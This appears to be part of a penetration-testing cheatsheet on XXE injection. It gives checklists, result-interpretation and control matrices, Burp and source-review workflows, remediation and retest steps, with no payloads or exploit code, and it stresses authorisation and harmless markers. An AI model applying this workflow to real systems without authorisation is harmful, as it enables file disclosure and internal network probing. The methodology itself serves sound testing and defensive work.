- [ ] XML endpoints identified
- [ ] SOAP endpoints reviewed
- [ ] XML imports reviewed
- [ ] SVG uploads reviewed
- [ ] Office/document uploads reviewed
- [ ] SAML XML processing considered
- [ ] Configuration imports reviewed
- [ ] Background processors considered

## Baseline

- [ ] Valid XML submitted
- [ ] Status recorded
- [ ] Response recorded
- [ ] Parser errors recorded
- [ ] Authentication context recorded

## Entity Processing

- [ ] Internal entity tested
- [ ] Entity expansion observed
- [ ] External entity tested
- [ ] External DTD behaviour reviewed
- [ ] XInclude considered where relevant

## OOB

- [ ] Unique callback hostname used
- [ ] Unique path used
- [ ] DNS interaction checked
- [ ] HTTP interaction checked
- [ ] Timestamp correlated
- [ ] Test repeated
- [ ] Sensitive data excluded from callback

## File Access

- [ ] File access testing authorised
- [ ] Harmless test file preferred
- [ ] Known file contents recorded
- [ ] Returned marker verified
- [ ] Sensitive files avoided unless required

## Internal Network

- [ ] Internal testing authorised
- [ ] Known test service preferred
- [ ] Broad scanning avoided
- [ ] Reachability separated from authentication
- [ ] XXE root cause distinguished from SSRF effect

## File Processing

- [ ] SVG processing reviewed
- [ ] XML uploads reviewed
- [ ] Office/document processing reviewed
- [ ] Async workers reviewed
- [ ] Conversion services reviewed

## Source Review

- [ ] XML parser calls searched
- [ ] User-controlled XML traced
- [ ] DTD settings reviewed
- [ ] External entities reviewed
- [ ] External DTD retrieval reviewed
- [ ] XInclude reviewed
- [ ] Resolver configuration reviewed
- [ ] Parser version/configuration identified

## Evidence

- [ ] Endpoint recorded
- [ ] Method recorded
- [ ] Content-Type recorded
- [ ] Authentication context recorded
- [ ] XML payload recorded
- [ ] OOB identifier recorded
- [ ] DNS interaction recorded
- [ ] HTTP interaction recorded
- [ ] Local test file evidence recorded
- [ ] Parser error recorded
- [ ] Timestamp recorded

## Remediation

- [ ] DTDs disabled where unnecessary
- [ ] External entities disabled
- [ ] External DTD loading disabled
- [ ] XInclude disabled where unnecessary
- [ ] Parser-specific hardening applied
- [ ] Least privilege reviewed
- [ ] Egress filtering considered
- [ ] Processing isolation considered
- [ ] Verbose errors reviewed

## Retest

- [ ] Original endpoint retested
- [ ] Normal XML functionality verified
- [ ] External entity retested
- [ ] OOB interaction absent
- [ ] File access retested where appropriate
- [ ] XInclude retested
- [ ] Upload workflow retested
- [ ] Background worker retested
- [ ] Equivalent parser locations reviewed


# XXE Type Comparison

| Type | Primary Observation | Typical Evidence |
|---|---|---|
| Classic XXE | Resource returned | Controlled file contents |
| Blind XXE | No direct response | DNS/HTTP callback |
| OOB XXE | External interaction | Controlled OOB service |
| Error-based XXE | Data/error leakage | Parser error |
| XInclude | Included external resource | Known controlled content |
| File-processing XXE | Parser invoked after upload | Callback or controlled file result |


# Result Interpretation Matrix

| Observation | Supports | Does Not Automatically Prove |
|---|---|---|
| XML accepted | XML processing surface | XXE |
| Internal entity expands | Entity processing | External access |
| DNS callback | External hostname resolution | HTTP retrieval |
| HTTP callback | External resource request | Local file access |
| Test file returned | Local file read | Arbitrary privileged file access |
| Internal 401 returned | Internal reachability | Authentication bypass |
| `DOCTYPE` rejected | DTD protection on tested path | All XML parsers are secure |
| XInclude works | XInclude processing | DTD-based XXE |
| Scanner reports XXE | Candidate | Confirmed vulnerability |
| XML parser found in source | Review target | Insecure configuration |


# Parser Review Matrix

| Pattern | Review Priority |
|---|---:|
| Constant trusted XML -> hardened parser | Low |
| User-generated structured data -> serializer | Low/Medium |
| User-controlled XML -> parser | High |
| XML upload -> background parser | High |
| SVG -> server-side XML processor | High |
| Document archive -> extracted XML parser | High |
| User XML -> parser with external resolution | Critical review candidate |


# XML Input Matrix

| Input | XML Likelihood |
|---|---:|
| `application/xml` request | High |
| `text/xml` request | High |
| SOAP request | High |
| SVG upload | High |
| SAML message | High |
| DOCX/XLSX/PPTX processing | Medium/High |
| Configuration import | Depends on format |
| JSON request | Low unless XML embedded |


# Security Control Matrix

| Control | Purpose |
|---|---|
| Disable DTDs | Prevent DTD processing |
| Disable external entities | Prevent entity resource resolution |
| Disable external DTDs | Prevent remote DTD loading |
| Disable XInclude | Prevent inclusion where unnecessary |
| Harden resolver | Restrict external resource access |
| Least privilege | Limit readable files |
| Egress filtering | Limit external/internal network access |
| Isolation | Reduce parser blast radius |
| Generic client errors | Reduce information disclosure |


# Burp Quick Workflow

```text
                 XML REQUEST
                      |
                      v
                   REPEATER
                      |
                      v
                VALID BASELINE
                      |
                      v
                INTERNAL ENTITY
                      |
             +--------+--------+
             |                 |
             v                 v
         EXPANDS           REJECTED
             |                 |
             v                 v
      EXTERNAL ENTITY    REVIEW CONTROL
             |
             v
        COLLABORATOR
          /       \
         /         \
        v           v
      DNS          HTTP
        \           /
         \         /
          +-------+
              |
              v
        INTERPRET RESULT
              |
              v
       MINIMAL VALIDATION
              |
              v
            REPORT
```


# Source Review Model

```text
                 UNTRUSTED INPUT
                       |
                       v
                    XML DATA
                       |
                       v
                  XML PARSER
                       |
             +---------+---------+
             |                   |
             v                   v
        DTD DISABLED         DTD ENABLED
             |                   |
             |                   v
             |            ENTITY RESOLUTION
             |              /          \
             |             /            \
             |            v              v
             |        DISABLED         ENABLED
             |                            |
             |                            v
             |                    EXTERNAL RESOURCE
             |                       /        \
             |                      /          \
             |                     v            v
             |                   FILE         HTTP
             |                     |            |
             +---------------------+------------+
                                   |
                                   v
                              SECURITY IMPACT
```


# Secure XML Processing Model

```text
                   UNTRUSTED XML
                        |
                        v
                HARDENED XML PARSER
                        |
          +-------------+-------------+
          |             |             |
          v             v             v
      NO DTDs       NO EXTERNAL    NO XINCLUDE
                      ENTITIES
          |             |             |
          +-------------+-------------+
                        |
                        v
                 SCHEMA / STRUCTURE
                    VALIDATION
                        |
                        v
                 APPLICATION LOGIC
```


# Final Testing Principle

The key XXE question is:

```text
CAN ATTACKER-CONTROLLED XML
             |
             v
CAUSE THE XML PARSER
             |
             v
TO RESOLVE AN EXTERNAL RESOURCE?
```

A strong XXE workflow is:

```text
Identify XML Input
       |
       v
Establish Valid Baseline
       |
       v
Test Internal Entity
       |
       v
Determine Entity Processing
       |
       v
Use Controlled External Entity
       |
       v
Observe DNS / HTTP
       |
       v
Repeat With Unique Marker
       |
       v
Use Harmless Local Test File if Required
       |
       v
Determine Actual Impact
       |
       v
Capture Evidence
       |
       v
Remediate Parser Configuration
       |
       v
Retest
```

For every XXE candidate ask:

```text
Does the application actually parse XML?

Where does parsing occur?

Which parser is used?

Does it support DTDs?

Are internal entities expanded?

Are external general entities enabled?

Are external parameter entities enabled?

Can external DTDs be retrieved?

Can XInclude be processed?

Can the parser make outbound requests?

Did I observe DNS only?

Did I observe HTTP?

Can a harmless local file be read?

Does the application return entity content?

Is processing synchronous or asynchronous?

Does a worker perform the parsing?

What operating-system privileges does the parser have?

Can the parser reach internal networks?

Is the observed network request an effect of XXE?

Could the XML merely be reflected rather than parsed?

Could a scanner be generating the callback?

Can the behaviour be reproduced?

What impact was actually demonstrated?

Has every relevant XML parser been hardened?
```

Do not stop at:

```text
The endpoint accepts XML.
```

Move through:

```text
XML INPUT
    |
    v
PARSER
    |
    v
ENTITY PROCESSING
    |
    v
EXTERNAL RESOLUTION
    |
    v
OBSERVABLE EVIDENCE
    |
    v
SECURITY IMPACT
```

That distinction separates a parser candidate from a defensible XXE finding.


# Related Cheatsheets

- [Web Application Security Cheatsheet](web.md)
- [Burp Suite Cheatsheet](burp-suite.md)
- [SSRF Cheatsheet](ssrf.md)
- [XSS Cheatsheet](xss.md)
- [SQL Injection Cheatsheet](sql-injection.md)
- [curl Cheatsheet](curl.md)
- [Content Discovery Cheatsheet](content-discovery.md)
- [Git and ripgrep Cheatsheet](git-ripgrep.md)


# Related Notes

- [Web Application Security](../web/index.md)
- [Web Testing Methodology](../web/methodology.md)
- [XXE](../web/xxe.md)
- [SSRF](../web/ssrf.md)
- [File Upload](../web/file-upload.md)
- [API Security](../web/api-security.md)
- [Source Code Review](../source-code-review/index.md)


# References

- [PortSwigger Web Security Academy - XML External Entity Injection](https://portswigger.net/web-security/xxe){ target="_blank" rel="noopener noreferrer" }
- [OWASP XML External Entity Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html){ target="_blank" rel="noopener noreferrer" }
- [OWASP Web Security Testing Guide - Testing for XML Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection){ target="_blank" rel="noopener noreferrer" }
- [Burp Suite Documentation - Collaborator](https://portswigger.net/burp/documentation/collaborator){ target="_blank" rel="noopener noreferrer" }
- [ProjectDiscovery Interactsh](https://github.com/projectdiscovery/interactsh){ target="_blank" rel="noopener noreferrer" }
- [Python defusedxml](https://github.com/tiran/defusedxml){ target="_blank" rel="noopener noreferrer" }


!!! tip "Start with a harmless marker"

    First determine whether the application parses XML and expands entities. A controlled marker such as `XXE_TEST_7f3a9` produces cleaner evidence than immediately requesting operating-system files.


!!! tip "Use OOB testing for blind parsers"

    When entity content is not returned in the response, a unique assessment-controlled hostname can establish whether the parser performs external DNS resolution or HTTP retrieval.


!!! tip "Separate DNS from HTTP"

    A DNS lookup demonstrates hostname resolution. An HTTP callback provides stronger evidence that the external resource was actually requested. Record the interaction type accurately.


!!! tip "Review every parser path"

    Applications often contain more than one XML parser. SOAP, SAML, document import, SVG processing and configuration import may each use different libraries or parser settings.


!!! warning "Avoid destructive entity expansion"

    XML entity expansion can consume substantial CPU and memory. Resource-exhaustion testing is unnecessary for routine XXE validation and should not be performed unless denial-of-service testing is explicitly authorised.


!!! warning "Fix the parser, not the payload"

    Blocking strings such as `DOCTYPE`, `SYSTEM` or `file://` at the application-input layer is not a reliable XXE defence. Disable unnecessary DTD, external entity and external resource processing in the XML parser itself, and apply least privilege and network restrictions as additional controls.
